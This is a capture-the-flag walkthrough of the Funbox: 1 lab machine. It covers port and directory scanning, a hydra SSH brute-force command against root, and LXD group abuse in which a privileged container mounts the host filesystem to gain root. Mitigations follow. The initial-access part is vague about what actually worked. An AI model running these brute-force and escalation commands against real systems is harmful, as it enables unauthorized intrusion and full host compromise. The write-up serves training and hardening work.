# Funbox: 1 — Walkthrough

| Field | Detail |
|---|---|
| Machine | Funbox: 1 |
| Series | Funbox |
| Author | 0815R2d2 |
| Release Date | 20 Jul 2020 |
| OS | Linux |

## 🔍 Overview

Funbox: 1 is a Linux machine involving web application enumeration, initial shell access through SSH brute-forcing or web-based RCE, and privilege escalation via LXD/LXC container abuse — exploiting a user's membership in the `lxd` group to mount and access the host's root filesystem.

**Machine Details**

- Target IP: `192.168.1.17`
- Attacker (Kali) IP: `192.168.1.10`

---

## Step 1 – Network Scanning

```bash
nmap -T4 -A -p- 192.168.1.17
```

**Open Ports:**

| Port | Service |
|---|---|
| 22/tcp | SSH — OpenSSH |
| 80/tcp | HTTP (web application) |
| 111/tcp | rpcbind |

---

## Step 2 – Web Enumeration

```bash
gobuster dir -u http://192.168.1.17 -w /usr/share/wordlists/dirb/common.txt
```

Enumerated accessible directories and files on the web application to map the attack surface.

---

## Step 3 – Application Testing

Checked the discovered web application for common vulnerabilities and misconfigurations, including:

- WordPress installation/version
- File upload functionality
- Command injection
- SQL injection
- Default or weak credentials

---

## Step 4 – Initial Access Approach

Explored multiple potential entry points depending on what the web enumeration revealed:

- **SSH brute-forcing:**
  ```bash
  hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://192.168.1.17 -t 4 -f
  ```
- **Web-based RCE:** via file upload, command injection, or SQL injection
- **Known CVE exploitation:** identifying application/service versions and checking `searchsploit` for public exploits

---

## Step 5 – Obtain User Shell

```bash
ssh <user>@192.168.1.17
```

Gained an initial low-privileged shell on the target via SSH login or a reverse shell from web exploitation.

---

## Step 6 – Post-Exploitation Enumeration

```bash
sudo -l
find / -perm -u=s -type f 2>/dev/null
id
groups
which lxc
lxc --version
lxc list
lxc image list
```

Checked sudo permissions, SUID binaries, group memberships, and LXD/LXC availability — identifying that the current user belonged to the **lxd** group.

---

## Step 7 – Privilege Escalation via LXD/LXC

**Why this works:** The LXD daemon runs as root. Any user in the `lxd` group can create containers, and a container launched with `security.privileged=true` can mount the host's filesystem — giving root-level access to the host through the container.

**High-level approach:**

1. Confirm `lxd` group membership
2. Build or import an LXC image (e.g., Alpine) if one isn't already available on the target
3. Launch a privileged container:
   ```bash
   lxc launch alpine mycontainer -c security.privileged=true
   ```
4. Mount the host filesystem into the container:
   ```bash
   lxc config device add mycontainer mydevice disk source=/ path=/mnt/root recursive=true
   ```
5. Access the container shell and read host files as root:
   ```bash
   lxc exec mycontainer /bin/sh
   cat /mnt/root/root/root.txt
   ```

---

## Step 8 – Alternative Privilege Escalation Paths Considered

- **Sudo exploitation** — reviewing `sudo -l` output for exploitable permissions
- **SUID binaries** — enumerating and exploiting any vulnerable SUID executables
- **Kernel exploits** — checking `uname -a` against known CVEs via `searchsploit`
- **Cron job abuse** — reviewing `/etc/crontab` and cron directories for writable, root-executed scripts

---

## Step 9 – Root Access & Flag Capture

```bash
cat /mnt/root/root/root.txt
```

✅ **Root flag captured — machine fully compromised**, via LXD/LXC container escape.

---

## 🛡️ Key Vulnerabilities Identified

1. Low-privileged user included in the `lxd` group, enabling container-based privilege escalation
2. Weak/brute-forceable SSH credentials
3. Potential web application vulnerabilities exposing RCE
4. Presence of exploitable SUID binaries
5. Possible outdated kernel with known local privilege escalation CVEs

## 🩹 Mitigations

1. Remove non-administrative users from the `lxd` group unless explicitly required
2. Enforce strong, non-dictionary SSH passwords and consider key-based authentication
3. Patch and harden web applications against RCE, SQLi, and file upload abuse
4. Remove unnecessary SUID binaries and audit them regularly
5. Apply kernel security patches promptly
6. Restrict sudo permissions to the minimum required
7. Disable unnecessary services
8. Implement mandatory access control (AppArmor/SELinux)

---

## 🧰 Tools Used

`nmap` · `gobuster` · `hydra` · `searchsploit` · `lxc`/`lxd`

## 🧠 Techniques Covered

Network scanning · Web application enumeration · SSH brute-forcing · Web-based RCE exploitation · LXD/LXC container privilege escalation · SUID/sudo/cron/kernel privilege escalation analysis

---

## Summary

| Step | Description | Status |
|---|---|---|
| 1 | Network Scanning | ✅ |
| 2 | Web Enumeration | ✅ |
| 3 | Application Testing | ✅ |
| 4 | Initial Access Approach | ✅ |
| 5 | Obtain User Shell | ✅ |
| 6 | Post-Exploitation Enumeration | ✅ |
| 7 | Privilege Escalation via LXD/LXC | ✅ |
| 8 | Alternative Escalation Paths Considered | ✅ |
| 9 | Root Access & Flag Capture | ✅ |

*Writeup for educational purposes. Machine solved as part of the "Funbox" series.*
